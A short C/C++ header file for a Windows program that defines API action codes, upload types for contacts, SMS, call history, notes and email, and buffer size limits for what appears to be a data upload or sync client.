#ifndef __DEFINE__
#define __DEFINE__

#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <io.h>
#include <sys/stat.h>
#include <direct.h>

#include <uma/bson/Object.h>
#include <uma/bson/ODMObject.h>
#include <uma/bson/Document.h>
#include <uma/bson/Array.h>
#include <uma/bson/String.h>
#include <uma/bson/Integer.h>

#include <iostream>
#include <sstream>
#include <fstream>
#include <vector>

#define POST_API_ACTION_INIT 101
#define POST_API_ACTION_LOGIN 102
#define POST_API_ACTION_UPLOAD 111
#define POST_API_ACTION_COMM 121
#define POST_API_ACTION_CONFIG 122
#define POST_API_ACTION_DOWNLOAD 123
#define POST_API_ACTION_INSTALL 124

#define UPLOAD_TYPE_CONTACT 101
#define UPLOAD_TYPE_SMS 102
#define UPLOAD_TYPE_CALLHISTORY 103
#define UPLOAD_TYPE_NOTES 104
#define UPLOAD_TYPE_EMAIL 105

#define SOCKET_MAX_BUF 65535
#define FILE_MAX_BUF 60000000
#define FILE_NAME_LEN 1000
#define EML_MAX_NUM 2000
#define MARK_MAX_BUF 200
#define MARK_MAX_NUMBER 6

#endif // __DEFINE__